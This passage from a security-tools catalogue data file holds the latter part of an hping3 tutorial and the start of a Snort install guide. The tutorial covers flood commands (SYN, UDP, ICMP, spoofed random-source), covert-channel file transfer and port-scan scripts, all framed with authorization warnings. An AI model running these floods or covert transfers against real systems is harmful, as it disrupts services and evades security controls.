expect\n*   **Hop-by-Hop Output:** For each hop, `hping3` will show the IP address of the router at that hop and the Round Trip Time (RTT) for the packet to reach it and return.\n*   **`len=... ip=... ttl=... rtt=... ms`:** Standard output format for responses, with `ttl` indicating the current hop count.\n*   **Time Exceeded:** Intermediate routers that receive a packet with a TTL of 1 (or 0) will send an `ICMP Time Exceeded` message, which `hping3` uses to identify the hop.\n*   **No Response:** Indicates a router that didn't respond (possibly filtered, or a silent device), or network congestion.\n*   **`target is down`:** Reaching the target or an indication that the target is unreachable.\n\n### Troubleshooting & tips\n*   **Firewall Blocking:** If you don't see results beyond a few hops, an intermediate firewall might be blocking the traceroute traffic (e.g., blocking ICMP Time Exceeded messages or the initial TCP/ICMP packets).\n*   **TTL Issues:** The default behavior of `hping3` traceroute is to increment TTL for each new target and send only one packet per TTL. Use `-c X` to send multiple packets per TTL for more robust results and to identify packet loss.\n*   **`--tr-keep-ttl`:** This option can be useful in complex network setups where the default TTL incrementing behavior might be problematic.\n*   **Protocol Choice:** Use TCP traceroute for services that rely on TCP (like HTTP) to see if a specific path is blocked for that service. Use ICMP traceroute for general network path analysis.\n*   **Compare with `traceroute`:** If `hping3` traceroute gives unexpected results, compare it with the output of the standard `traceroute` or `tracert` utility to identify discrepancies.\n\n### Safety / ethics note\nTraceroute functionality, while primarily diagnostic, still generates traffic that travels across multiple network devices. While generally considered a low-impact activity, excessive or continuous tracerouting can still contribute to network noise and trigger monitoring systems. Be aware that the IP addresses revealed along the path might belong to third-party networks. Always conduct traceroute responsibly and avoid targeting critical infrastructure without explicit authorization.\n\n## 10. DoS Testing & Load Testing\n\n### What it is / Why it matters\nDenial of Service (DoS) testing, or more accurately, **load testing** (when authorized and controlled), involves sending a large volume of traffic to a target to assess its resilience and capacity to handle high loads. `hping3` can be used to simulate various flood attacks, such as SYN floods, UDP floods, or ICMP floods, which can consume resources on the target system or network infrastructure. This helps in understanding potential vulnerabilities to DoS attacks and measuring the breaking point of a system under stress.\n\n### Step-by-step commands\n\n#### Flood Testing\nThe `--flood` option sends packets as fast as possible, without displaying replies. This is a very high-impact operation.\n\n```bash\n# SYN flood test to port 80: Continuously sends SYN packets.\nsudo hping3 -S target.com -p 80 --flood\n\n# UDP flood test to DNS port 53: Continuously sends UDP packets.\nsudo hping3 --udp target.com -p 53 --flood\n\n# ICMP flood test: Continuously sends ICMP echo requests.\nsudo hping3 -1 target.com --flood\n```\n\n#### Controlled Load Testing\nInstead of `flood` mode, use `-i` (interval) to send packets at a controlled, high rate.\n\n```bash\n# High-rate SYN packets (1000 packets per second or 1ms interval)\nsudo hping3 -S target.com -p 80 -i u1000\n\n# Bandwidth test with large data payload (1400 bytes, 100ms interval)\n# This simulates transferring a significant amount of data, testing bandwidth capacity.\nsudo hping3 -S target.com -p 80 -d 1400 -i u100000\n\n# Connection exhaustion test with random source IPs (to fill connection tables on firewalls/servers)\nsudo hping3 -S target.com -p 80 --rand-source -i u1000\n```\n\n### What to expect\n*   **No `hping3` Output (Flood Mode):** When `--flood` is used, `hping3` does not display replies to save resources and send packets at maximum speed.\n*   **Target Performance Degradation:** If the test is effective, you might observe the target system becoming slow, unresponsive, or services failing to respond.\n*   **Network Congestion:** Intermediate network devices (routers, switches) might show increased load, packet loss, or even temporary outages.\n*   **Firewall/IDS Alerts:** High volumes of traffic, especially floods, will almost certainly trigger alerts on Intrusion Detection/Prevention Systems and firewalls.\n*   **Connection Table Overload:** For SYN floods, firewalls and target systems may exhaust their connection tables, leading to legitimate connections being dropped.\n\n### Troubleshooting & tips\n*   **Monitor Target Performance:** Always monitor the target system's CPU, memory, network I/O, and service availability during load tests.\n*   **Monitor Network:** Use `tcpdump`, Wireshark, or network monitoring tools to observe the traffic generated and its impact on the network.\n*   **Start Small:** Begin with very low rates and gradually increase the packet interval to prevent accidental DoS.\n*   **Simulate Realistic Traffic:** For true load testing, combine `hping3` with other tools or scripts to simulate more complex and realistic traffic patterns rather than just raw floods.\n*   **Source IP Spoofing:** Using `--rand-source` or `-a` can make it harder for the target to block the attacker's IP and can test the resilience of systems against spoofed attacks. However, it also makes it harder to identify your own traffic if debugging.\n*   **Resource Management:** Running `hping3` in flood mode can consume significant resources on your attacking machine, potentially impacting its stability.\n\n### Safety / ethics note\n**WARNING: DoS testing and flood attacks are extremely high-impact operations that can cause significant disruption, data loss, and lead to service outages. Unauthorized DoS attacks are illegal in virtually all jurisdictions and can result in severe legal penalties, including imprisonment and substantial fines.**\n\n*   **Explicit Authorization REQUIRED:** Never, under any circumstances, perform DoS or flood testing on any system or network without **explicit, written permission** from the asset owner. This permission should clearly define the scope, duration, and acceptable impact of the test.\n*   **Controlled Environment:** Conduct such tests in isolated lab environments or during pre-arranged maintenance windows to minimize risk to production systems.\n*   **Emergency Stop:** Have a clear plan to immediately stop the test if unexpected behavior or significant disruption occurs.\n*   **Understand Impact:** Fully understand the potential impact on dependent systems and services before initiating a test.\n\n## 11. Advanced Features\n\n### What it is / Why it matters\nBeyond basic packet crafting, `hping3` offers advanced features such as covert channel file transfer, custom payload insertion, and scripting capabilities. These features allow for more sophisticated penetration testing techniques, in-depth protocol analysis, and automation of complex network interactions, making `hping3` a powerful tool for specialized tasks where standard utilities might fall short.\n\n### Step-by-step commands\n\n#### File Transfer\n`hping3` can transfer files over a \"covered channel\" by embedding data into packet fields. This can bypass some security measures.\n\n```bash\n# Sender: Send a file to a target using TCP port 80 with a specific signature.\n# The target must be listening for this signature.\nsudo hping3 target.com -p 80 --file /path/to/local/file.txt --sign mysecret_signature\n\n# Receiver: Listen for an incoming file transfer with the matching signature.\n# The received file will be named \"rec-mysecret_signature\".\nsudo hping3 --listen mysecret_signature --safe\n```\n\n#### Custom Payloads\nInsert arbitrary data into the packet payload for custom tests or application-layer probing.\n\n```bash\n# Send custom data from a file (e.g., a raw HTTP request, a custom protocol header)\n# -E or --file_data option. -d specifies the total data size including this.\nsudo hping3 -S target.com -p 80 -d 100 -E /path/to/custom_payload.bin\n\n# Send a specific string as data (e.g., a simple command or identifier)\n# --data option with size\nsudo hping3 -S target.com -p 80 --data 1400 --data-string \"Hello hping3!\"\n```\n\n#### Scripting Mode\n`hping3` has a simple scripting language for automating sequences of packet sends.\n\n```bash\n# Example script.hping content:\n# send SYN\n# wait 100ms\n# send ACK\n# wait 100ms\n# send RST\n\n# Execute a hping3 script against a target\nsudo hping3 --script script.hping target.com\n\n# Interactive mode: Allows for real-time command entry within hping3.\nsudo hping3 --interactive\n```\n\n### What to expect\n*   **File Transfer:**\n    *   **Sender:** `hping3` will show progress messages as it sends chunks of the file.\n    *   **Receiver:** `hping3` will indicate when it starts listening and when a file is being received, eventually saving it to disk (e.g., `rec-mysecret_signature`).\n*   **Custom Payloads:** The target system or a packet sniffer will observe packets containing the specified custom data in their payload section. `hping3` itself won't typically interpret the payload.\n*   **Scripting Mode:** The script will execute its commands sequentially, and `hping3` will output results for each command as if they were entered manually. Interactive mode will provide a prompt (`hping3>`) for live input.\n\n### Troubleshooting & tips\n*   **File Transfer Issues:**\n    *   Ensure the sender and receiver are using the exact same signature.\n    *   Verify network connectivity and firewall rules are not blocking the chosen port.\n    *   The `--safe` option on the receiver prevents executing arbitrary commands but might not handle all file types securely.\n    *   The file transfer isn't encrypted by default, so sensitive data should not be transferred this way.\n*   **Custom Payloads:**\n    *   Ensure payload size (`-d`) is sufficient for your data, or use `--data-string` for simple strings.\n    *   For binary data, `-E` is crucial.\n    *   Verify the byte order if sending complex structures.\n*   **Scripting:**\n    *   `hping3`'s scripting language is very basic. For complex automation, consider wrapping `hping3` calls in Bash or Python scripts.\n    *   Syntax errors in `script.hping` will cause the script to fail.\n\n### Safety / ethics note\n*   **File Transfer (Covert Channels):** Using `hping3` for covert file transfer can bypass legitimate security controls and exfiltrate data. This is a highly sensitive capability and should only be tested with explicit authorization and under strict control. There are no built-in encryption or integrity checks; data can be intercepted or corrupted.\n*   **Custom Payloads:** Inserting arbitrary data can potentially confuse network devices or even exploit vulnerabilities if the target service is poorly designed. Ensure your payloads are benign during testing.\n*   **Scripting:** Automated `hping3` actions, especially floods or sophisticated scans, can quickly escalate into a disruptive or illegal activity if not carefully controlled. Always review scripts thoroughly before execution.\n\n## 12. Practical Examples\n\n### What it is / Why it matters\nApplying `hping3` in real-world scenarios demonstrates its versatility and practical value. These examples illustrate how to combine `hping3`'s features for common tasks like network discovery, service detection, and firewall analysis, offering insights into how professionals use the tool in their daily operations.\n\n### Step-by-step commands\n\n#### Network Discovery\nIdentify live hosts within a network segment by sending ICMP echo requests.\n\n```bash\n# Discover live hosts in a 192.168.1.0/24 subnet\n# This script iterates through IP addresses, sends one ICMP packet, and filters for replies.\n# '2>/dev/null' suppresses error messages, '&' runs hping3 in background, 'wait' waits for all to finish.\nfor i in {1..254}; do\n    sudo hping3 -1 -c 1 -W 1 192.168.1.$i 2>/dev/null | grep \"bytes from\" &\ndone\nwait\n```\n\n#### Service Detection\nCheck for the presence of specific network services on a target host.\n\n```bash\n# Check if a web server is running on port 80 (TCP SYN to port 80)\n# A SYN-ACK response indicates an open port.\nsudo hping3 -S target.com -p 80 -c 1\n\n# Test multiple common ports for TCP services\nfor port in 21 22 23 25 53 80 110 143 443 993 995; do\n    echo \"Testing port $port...\"\n    # -W 1 for a 1-second timeout\n    if sudo hping3 -S target.com -p $port -c 1 -W 1 2>/dev/null | grep -q \"flags=SA\"; then\n        echo \"Port $port is OPEN\"\n    else\n        echo \"Port $port is CLOSED or FILTERED\"\n    fi\ndone\n```\n\n#### Firewall Analysis\nQuickly assess how a firewall responds to different TCP flags for a specific port.\n\n```bash\n# Test firewall rules for port 80\necho \"Testing port 80 with SYN flag...\"\nsudo hping3 -S target.com -p 80 -c 3    # Expect SYN-ACK if open/unfiltered\n\necho \"Testing port 80 with ACK flag...\"\nsudo hping3 -A target.com -p 80 -c 3    # Expect RST if unfiltered, no response if filtered\n\necho \"Testing port 80 with FIN flag (stealth scan)...\"\nsudo hping3 -F target.com -p 80 -c 3    # Expect no response if open/unfiltered, RST-ACK if closed/unfiltered\n```\n\n### What to expect\n*   **Network Discovery:** A list of IP addresses on the subnet that responded to the ICMP echo requests, indicating live hosts.\n*   **Service Detection:** Clear indications for each tested port as \"OPEN\" or \"CLOSED/FILTERED\" based on SYN-ACK responses.\n*   **Firewall Analysis:** Varies depending on the firewall. You'll observe differences in `hping3`'s output (SYN-ACK, RST-ACK, no response, ICMP unreachable) that directly reflect how the firewall is configured to handle different packet types for the specific port.\n\n### Troubleshooting & tips\n*   **Bash Scripting:** When integrating `hping3` into scripts, remember to handle `sudo` permissions, error redirection (`2>/dev/null`), and backgrounding (`&`) appropriately.\n*   **Timeout & Interval:** Adjust `-W` (timeout) and `-i` (interval) for slower networks or to avoid overwhelming targets/firewalls.\n*   **Grepping Output:** Use `grep` effectively to filter `hping3` output for specific strings like `flags=SA` or `bytes from` to parse results programmatically.\n*   **Rate Limiting:** Be cautious with loops for scanning ranges; too many concurrent `hping3` instances can overload your system or trigger network alerts.\n*   **Combine with Nmap:** For more comprehensive and reliable network discovery, service detection, and firewall analysis, `nmap` is often preferred. `hping3` is ideal for highly specific, low-level tests or when Nmap is not an option.\n\n### Safety / ethics note\nThese practical examples, while illustrative, still constitute network probing and should only be performed on networks you own or have explicit authorization to test. Network discovery and service detection can be logged by target systems and interpreted as malicious reconnaissance. Firewall analysis, especially when probing for weaknesses, carries a higher risk of triggering security alarms and could be considered hostile. Always prioritize obtaining proper permissions.\n\n## 13. Output Analysis\n\n### What it is / Why it matters\nInterpreting `hping3`'s output is as crucial as sending the packets themselves. The tool provides detailed information about each received response packet, including its length, source IP, TTL, TCP flags, sequence numbers, and Round Trip Time (RTT). Understanding these components allows you to accurately diagnose network issues, identify open/closed/filtered ports, and gain insights into the behavior of target systems and intermediate network devices.\n\n### Step-by-step commands\nThis section focuses on understanding existing output, so no specific commands are run here. The commands generating typical output are covered in previous sections.\n\n### What to expect\nHere's a breakdown of a typical `hping3` output line and its components:\n\n```\nHPING target (eth0 192.168.1.100): S set, 40 headers + 0 data bytes\nlen=46 ip=192.168.1.100 ttl=64 DF id=0 sport=80 flags=SA seq=0 win=65535 rtt=1.2 ms\n```\n\n*   **`HPING target (...)`**: Initial line showing the target being probed, its resolved IP (if applicable), and some basic info about the sent packet (e.g., `S set` means SYN flag was set).\n*   **`len=46`**: The total length of the received packet in bytes.\n*   **`ip=192.168.1.100`**: The source IP address of the responding host.\n*   **`ttl=64`**: Time To Live. This value indicates how many hops the packet can still traverse. Lower values suggest more hops.\n*   **`DF`**: Don't Fragment flag set. Indicates the packet should not be fragmented by routers.\n*   **`id=0`**: IP identification field. Can sometimes be used for OS fingerprinting or tracking.\n*   **`sport=80`**: Source port of the responding packet. For a SYN-ACK, this is typically the destination port you targeted.\n*   **`flags=SA`**: TCP flags set in the response.\n    *   `SA` (SYN-ACK): Indicates an open TCP port.\n    *   `RA` (RST-ACK): Indicates a closed TCP port (active rejection).\n    *   `R` (RST): Can indicate a closed port or a firewall resetting a connection.\n    *   Other flags (F, P, U): May appear in specific crafted responses.\n*   **`seq=0`**: Sequence number of the response packet.\n*   **`win=65535`**: TCP window size. Can indicate the buffer size the target system has allocated for receiving data.\n*   **`rtt=1.2 ms`**: Round Trip Time. The time it took for the packet to reach the target and for the response to return.\n\n#### Response Analysis\n*   **Open TCP Port:** Typically indicated by `flags=SA` (SYN-ACK) in response to a SYN packet.\n*   **Closed TCP Port:** Typically indicated by `flags=RA` (RST-ACK) in response to a SYN packet, or `flags=R` in response to an ACK, FIN, NULL, or XMAS packet.\n*   **Filtered TCP/UDP/ICMP Port:** Often results in no response, or an `ICMP Destination Unreachable` message from an intermediate device.\n*   **Stealth Scans (FIN, NULL, XMAS):** An *open* port will usually return *no response*. A *closed* port will return `flags=RA`. This inversion is what makes them \"stealthy\".\n*   **ICMP Responses:** For an ICMP Echo Request (`-1`), you expect `bytes from` messages with `ttl` and `rtt`.\n\n### Troubleshooting & tips\n*   **No Output:** If `hping3` runs but shows no output, check for local firewalls blocking `hping3`'s ability to send or receive, or network connectivity issues. Also, ensure the target is actually up and reachable.\n*   **Unexpected Flags:** If you're seeing unexpected TCP flags, a firewall, IDS/IPS, or load balancer might be modifying packets in transit.\n*   **High RTT:** Indicates network latency, congestion, or a slow responding target.\n*   **Low TTL:** Suggests the target is many hops away, or an intermediate device is dropping TTLs aggressively.\n*   **Packet Sniffing:** When `hping3` output is confusing, always run `tcpdump` or Wireshark concurrently to analyze the raw packets on the wire. This provides the most accurate view of what's happening.\n\n### Safety / ethics note\nAnalyzing `hping3` output is a diagnostic activity and carries minimal direct safety risks. However, the data you gather can reveal sensitive information about network topology, operating systems, and service configurations. Ensure that any information obtained is handled securely and used only for authorized purposes. Do not share sensitive findings without proper authorization.\n\n## 14. Scripting & Automation\n\n### What it is / Why it matters\nAutomating `hping3` operations through scripting (e.g., Bash) significantly enhances its utility for repetitive tasks, continuous monitoring, or integrating `hping3` into larger security or network management workflows. Scripting allows for programmatic control over scans, parsing of output, and dynamic adjustments, turning `hping3` from a manual command-line tool into a powerful component of an automated system.\n\n### Step-by-step commands\n\n#### Bash Integration\n`hping3` is easily integrated into Bash scripts, allowing for flexible control and output processing.\n\n```bash\n#!/bin/bash\n# Simple Port Scanner Script using hping3\n# Usage: ./scan_ports.sh <target_IP_or_hostname>\n\ntarget=$1\n\nif [ -z \"$target\" ]; then\n    echo \"Usage: $0 <target_IP_or_hostname>\"\n    exit 1\nfi\n\necho \"Starting TCP SYN scan on $target for ports 1-1000...\"\nfor port in {1..1000}; do\n    # -c 1: send 1 packet, -W 1: wait 1 second for reply\n    # 2>/dev/null: suppress hping3's stderr output\n    # grep -q \"flags=SA\": check quietly for SYN-ACK flag in response\n    if sudo hping3 -S \"$target\" -p \"$port\" -c 1 -W 1 2>/dev/null | grep -q \"flags=SA\"; then\n        echo \"Port $port is OPEN\"\n    fi\ndone\necho \"Scan complete.\"\n```\n\n#### Network Monitoring\nA basic script to continuously monitor the availability of a host.\n\n```bash\n#!/bin/bash\n# Basic Host Availability Monitor using hping3 (ICMP)\n# Usage: ./monitor_host.sh <host_IP_or_hostname>\n\nhost_to_monitor=$1\n\nif [ -z \"$host_to_monitor\" ]; then\n    echo \"Usage: $0 <host_IP_or_hostname>\"\n    exit 1\nfi\n\necho \"Monitoring $host_to_monitor every 60 seconds. Press Ctrl+C to stop.\"\n\nwhile true; do\n    # Send 1 ICMP echo request, wait 2 seconds. Suppress all hping3 output.\n    if sudo hping3 -1 -c 1 -W 2 \"$host_to_monitor\" >/dev/null 2>&1; then\n        echo \"$(date '+%Y-%m-%d %H:%M:%S'): $host_to_monitor is UP\"\n    else\n        echo \"$(date '+%Y-%m-%d %H:%M:%S'): $host_to_monitor is DOWN\"\n    fi\n    sleep 60 # Wait for 60 seconds before next check\ndone\n```\n\n### What to expect\n*   **Port Scanner:** The script will iterate through the specified port range and print a message for each port detected as \"OPEN\" based on the SYN-ACK response.\n*   **Network Monitor:** The script will continuously print status updates (UP or DOWN) for the monitored host, along with a timestamp, every 60 seconds.\n*   **Script Execution:** You'll see the script's `echo` messages and the results of its `hping3` calls processed according to the script's logic.\n\n### Troubleshooting & tips\n*   **`sudo` in Scripts:** When `hping3` is called within a script, it still requires `sudo`. Ensure the user running the script has `sudo` privileges configured to run commands without password for the script (e.g., via `visudo` entries), or handle password prompts appropriately.\n*   **Error Handling:** Always redirect `stderr` (`2>/dev/null`) if you don't want `hping3`'s error messages to clutter your script's output. Add checks (`if [ -z \"$var\" ]`) for missing arguments.\n*   **Parsing Output:** Use `grep`, `awk`, `sed`, or other text processing tools to extract specific information from `hping3`'s output.\n*   **Timeout & Interval:** Be mindful of the timeout (`-W`) and interval (`-i`) settings in your scripts, especially when scanning many ports or monitoring frequently, to avoid network overload.\n*   **Concurrency:** For very large scans or monitoring many hosts, consider using parallel execution techniques (e.g., `xargs -P`, GNU `parallel`) to speed up scripts, but be aware of the increased network load.\n\n### Safety / ethics note\nAutomated scripts can significantly amplify the impact of `hping3`. An improperly configured or malicious script can quickly lead to widespread network disruption, trigger numerous security alerts, or cause a Denial of Service.\n\n*   **Script Validation:** Thoroughly test all scripts in a controlled environment before deploying them in production or on external networks.\n*   **Rate Limiting:** Implement rate limiting and delays (`sleep`) within your scripts to prevent overwhelming target systems or networks, especially during continuous monitoring or scanning.\n*   **Authorization:** As always, ensure explicit, written authorization is in place for any automated network probing or testing activities.\n*   **Logging:** Implement robust logging within your scripts to record actions taken, responses received, and any errors. This is crucial for accountability and debugging.\n\n## 15. Pro Tips & Best Practices\n\n### What it is / Why it matters\nAdopting best practices and utilizing advanced tips can significantly improve the effectiveness, efficiency, and safety of your `hping3` operations. These recommendations help you get the most out of the tool while minimizing risks and ensuring responsible usage.\n\n### Step-by-step commands\n(No specific commands here, as this section provides general advice.)\n\n### What to expect\nBy following these tips, you can expect more reliable scan results, reduced false positives/negatives, better performance, increased stealth, and a lower risk of causing unintended network disruption or legal issues. Your `hping3` usage will become more proficient and professional.\n\n### Troubleshooting & tips\n*   **Use `sudo` Consistently:** `hping3` requires root privileges for raw socket operations. Always prefix your commands with `sudo`.\n*   **Start with Small Intervals/Counts:** When testing new targets or unfamiliar options, begin with very few packets (`-c 1` or `-c 3`) and longer intervals (`-i 1`) to observe behavior and avoid accidental impact.\n*   **Combine with Packet Sniffers:** Use tools like Wireshark or `tcpdump` alongside `hping3` to analyze the actual packets on the wire. This is invaluable for debugging, understanding responses, and confirming packet crafting.\n*   **Test Firewall Rules with Diverse Flags:** Don't just rely on SYN scans. Experiment with ACK, FIN, NULL, and XMAS flags to thoroughly test firewall behavior and identify bypasses.\n*   **Monitor Responses Closely:** Pay attention to not just the presence or absence of a response, but also the details like TTL, window size, IP ID, and any ICMP error messages. These provide deeper insights.\n*   **Adjust Timing (`-i`, `-W`):** Tailor the packet interval (`-i`) and reply timeout (`-W`) based on network conditions, target responsiveness, and the desired stealth level. Slower networks need longer timeouts; faster scans need shorter intervals.\n*   **Document Everything:** Keep detailed logs of your scan parameters, target responses, and any findings. This is crucial for reports, post-analysis, and compliance.\n*   **Respect Rate Limits:** Be mindful of rate limiting imposed by network devices or target systems. Avoid aggressive scanning that could lead to IP bans or trigger DoS prevention mechanisms.\n*   **Spoofing & Randomization:** Use `--rand-source` or `--rand-source-port` to test the resilience of stateful firewalls or to evade simple logging, but remember this complicates debugging.\n*   **Consider Alternatives:** For tasks like comprehensive service enumeration and OS fingerprinting, `nmap` is often a more feature-rich and user-friendly tool. Use `hping3` for its unique packet crafting capabilities.\n\n### Safety / ethics note\nAdhering to best practices is integral to ethical `hping3` usage. Ignoring these tips can lead to:\n*   Accidental DoS of critical systems.\n*   Triggering legal action due to unauthorized activity.\n*   Compromising the integrity of your test results.\n*   Damaging your reputation as a responsible network professional.\n**Always prioritize obtaining explicit, written authorization and operate within defined scopes and parameters.**\n\n## 16. Common Issues & Troubleshooting\n\n### What it is / Why it matters\nEncountering issues is a normal part of working with low-level networking tools like `hping3`. This section addresses common problems users face, from permission errors to network connectivity challenges, providing clear troubleshooting steps. Understanding how to diagnose and resolve these issues efficiently ensures a smoother workflow and more accurate test results.\n\n### Step-by-step commands\n(No standalone commands, as these are troubleshooting steps for previous commands.)\n\n### What to expect\nBy following the troubleshooting steps, you should be able to identify the root cause of common `hping3` problems and apply the correct solutions, allowing your commands to execute as intended and produce meaningful output.\n\n### Troubleshooting & tips\n\n#### Permission Issues\n*   **Run with `sudo`:** Most `hping3` operations require root privileges to access raw sockets.\n    ```bash\n    sudo hping3 -S target.com -p 80\n    ```\n*   **Check Raw Socket Permissions:** On some Linux systems, you might need to grant capabilities to the `hping3` executable so non-root users can use it (use with caution, as this reduces security).\n    ```bash\n    # Check current capabilities\n    getcap /usr/sbin/hping3\n    # Grant raw network capabilities (use carefully!)\n    sudo setcap cap_net_raw+ep /usr/sbin/hping3\n    # Revoke capabilities if needed\n    sudo setcap -r /usr/sbin/hping3\n    ```\n*   **SELinux/AppArmor:** If you're on a system with SELinux or AppArmor, check logs (`dmesg`, `audit.log`) for denials related to `hping3` and adjust policies if necessary.\n\n#### Network Issues\n*   **Verify Interface:** Ensure your network interface is up and configured correctly.\n    ```bash\n    ip addr show # Linux\n    ifconfig -a # macOS/BSD\n    ```\n*   **Check Routing:** Confirm that your system has a valid route to the target network.\n    ```bash\n    ip route show # Linux\n    netstat -rn # macOS/BSD\n    ```\n*   **Test Local Connectivity:** Rule out local network issues by pinging your localhost.\n    ```bash\n    sudo hping3 -1 127.0.0.1\n    ```\n*   **DNS Resolution:** If using hostnames, ensure DNS is resolving correctly. Use `dig` or `nslookup`.\n\n#### No Response Issues\n*   **Increase Timeout:** The default timeout might be too short for slow networks or distant targets.\n    ```bash\n    sudo hping3 -S target.com -p 80 -W 5 # Wait up to 5 seconds\n    ```\n*   **Verify Target is Up:** Perform a basic ICMP ping to ensure the target host is generally reachable.\n    ```bash\n    sudo hping3 -1 target.com -c 3\n    ```\n*   **Try Different Protocols/Ports:** The specific port or protocol you're testing might be blocked. Try common, generally open ports (e.g., TCP 80, 443, ICMP) to establish a baseline.\n    ```bash\n    sudo hping3 --udp target.com -p 53\n    ```\n*   **Check Firewalls (Local & Remote):** Ensure no firewall (on your machine, the target, or intermediate network devices) is blocking the specific traffic `hping3` is sending or receiving.\n*   **Packet Capture:** The most definitive way to troubleshoot \"no response\" is to capture packets on your local interface (`tcpdump -i eth0 host target.com`) to see if packets are even being sent out and if any replies are coming back.\n\n### Safety / ethics note\nTroubleshooting is an iterative process of testing and observation. While generally safe, continuously probing a system with various parameters during troubleshooting can still generate detectable traffic. Be mindful of the impact of repeated attempts, especially when dealing with production systems. Always pause and analyze results rather than blindly trying combinations.\n\n## 17. Legal Disclaimer\n\n### What it is / Why it matters\nThis legal disclaimer explicitly outlines the boundaries of acceptable use for `hping3` and warns against its misuse. Understanding these legal and ethical considerations is paramount to ensure that the tool is used responsibly, professionally, and within the bounds of the law, protecting both the user and potential targets from harm.\n\n### Step-by-step commands\n(No specific commands, as this is a warning.)\n\n### What to expect\nBy reviewing this disclaimer, you should have a clear understanding of the legal and ethical responsibilities associated with using `hping3`. This awareness is intended to guide your actions towards authorized and beneficial network activities, and away from potentially illegal or harmful practices.\n\n### Troubleshooting & tips\n*   **If in doubt, don't:** If you are unsure whether an activity is authorized or legal, refrain from performing it.\n*   **Seek legal counsel:** For complex scenarios or if you have specific concerns about your activities, consult with legal professionals specializing in cybersecurity law.\n*   **Obtain written permission:** Always prioritize obtaining clear, unambiguous, and written authorization for any testing that involves networks or systems you do not own.\n\n### Safety / ethics note\n**WARNING: `hping3` is a powerful tool designed for network testing, analysis, and security research. It should ONLY be used for:**\n\n*   **Testing your own networks and systems.**\n*   **Authorized penetration testing with explicit, written permission from the asset owner.**\n*   **Educational purposes in controlled lab environments.**\n*   **Network troubleshooting and administration.**\n\n**Unauthorized network scanning, Denial of Service (DoS) testing, packet crafting, or any form of unauthorized access or disruption may violate computer crime laws (e.g., Computer Fraud and Abuse Act in the USA, similar laws globally) and network Acceptable Use Policies. Flood attacks, in particular, are highly disruptive and may be considered illegal and harmful.**\n\n**Always obtain proper authorization, understand the potential impact of your actions, and use `hping3` responsibly and ethically. Misuse can lead to severe legal penalties, including imprisonment and substantial fines.**"
      }
    ]
  },
  {
    "name": "Scapy",
    "description": "A powerful Python-based interactive packet manipulation program.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "packet crafting",
      "protocol analysis",
      "python"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Ettercap",
    "description": "A comprehensive suite for man-in-the-middle attacks.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "mitm",
      "sniffing",
      "arp spoofing"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Bettercap",
    "description": "Powerful, easily extensible and portable framework for MITM attacks.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "mitm",
      "network monitoring",
      "modular"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Responder",
    "description": "A LLMNR, NBT-NS and MDNS poisoner.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "poisoning",
      "credential capture",
      "internal pentest"
    ],
    "color": "#4be575"
  },
  {
    "name": "Zeek (Bro)",
    "description": "A powerful network analysis framework.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "ids",
      "network security monitoring",
      "traffic analysis"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Snort",
    "description": "An open-source intrusion prevention system (IPS).",
    "category": "Network Scanning & Analysis",
    "tags": [
      "ids",
      "ips",
      "packet logging"
    ],
    "color": "#9be54b",
    "articles": [
      {
        "title": "🐍 Snort — Complete Intrusion Detection & Prevention Guide",
        "content": "# 🐍 Snort — Complete Intrusion Detection & Prevention Guide\n\nSnort is an **open-source**, free, and lightweight **Network Intrusion Detection System (NIDS)** for Linux and Windows.  \nDeveloped by **Martin Roesch** and maintained by **Cisco**, Snort performs **real-time traffic analysis**, **packet logging**, and **rule-based detection** to identify malicious activity.  \n\nSnort can function as:\n- A **packet sniffer**\n- A **packet logger**\n- A **full-fledged NIDS**\n\n---\n\n## 🧩 1. Why Snort Matters\n\nSnort is widely used by **security professionals** and **network administrators** for:\n- Detecting intrusions in real time  \n- Logging and analyzing network traffic  \n- Writing **custom detection rules**  \n- Integrating with SIEM systems (Splunk, ELK, Graylog)  \n- Learning network forensics and packet analysis  \n\n---\n\n## ⚙️ 2. Installation & Setup\n\n### 🐧 Ubuntu / Debian Installation\n\n```bash\n Update repositories\nsudo apt update\n\n Install Snort\nsudo apt install snort -y\n\n Install dependencies\nsudo apt install libpcap-dev libpcre3-dev libdumbnet-dev     zlib1g-dev libluajit-5.1-dev libnghttp2-dev -y\n\n Verify installation\nsnort -V\n```\n\n---\n\n### 🧱 CentOS / RHEL Installation\n\n```bash\n Enable EPEL repository\nsudo yum install epel-release -y\n\n Install Snort\nsudo yum install snort -y\n\n Install dependencies\nsudo yum install libpcap-devel pcre-devel libdnet-devel     zlib-devel luajit-devel nghttp2-devel -y\n\n Verify installation\nsnort -V\n```\n\n---\n\n### 🪟 Windows Installation\n\n1. Download Snort from: [https://www.snort.org/downloads](https://www.snort.org/downloads)  \n2. Install **WinPcap** or **Npcap**:  \n   - [https://www.winpcap.org/](https://www.winpcap.org/)  \n   - [https://nmap.org/npcap/](https://nmap.org/npcap/)  \n3. Run the installer as **Administrator** and follow the wizard.  \n\n**Minimum Requirements:**\n- Windows 7 or later  \n- 2GB RAM (4GB+ recommended)  \n- 500MB free disk space  \n\n---\n\n### 🧰 Building Snort from Source (Linux)\n\n```bash\n Install build tools\nsudo apt install build-essential autoconf automake libtool     libpcap-dev libpcre3-dev libdnet-dev zlib1g-dev     libluajit-5.1-dev libnghttp2-dev -y\n\n Download source code\nwget https://www.snort.org/downloads/snort/snort-2.9.20.tar.gz\ntar -xvzf snort-2.9.20.tar.gz\ncd snort-2.9.20\n\n Build and install\n./configure --enable-sourcefire\nmake\nsudo make install\n\n Verify installation\nsnort -V\n```\n\n---\n\n## 🧮 3. Verification\n\n```bash\n Check Snort version\nsnort -V\n\n Test configuration\nsnort -T -c /etc/snort/snort.conf -i eth0\n```\n\n✅ Expected Output:\n```\nSnort successfully validated the configuration!\nSnort exiting\n```\n\n---\n\n## 🧠 4. Getting Started\n\n### Edit Main Configuration\n```bash\nsudo nano /etc/snort/snort.conf\n```\n\nKey parameters to review:\n- `var HOME_NET 192.168.1.0/24`\n- `var EXTERNAL_NET any`\n- `include $RULE_PATH/local.rules`\n\n---\n\n### Run Snort\n\n```bash\n Sniffer Mode\nsudo snort -i eth0 -v\n\n NIDS Mode\nsudo snort -c /etc/snort/snort.conf -i eth0\n\n Daemon 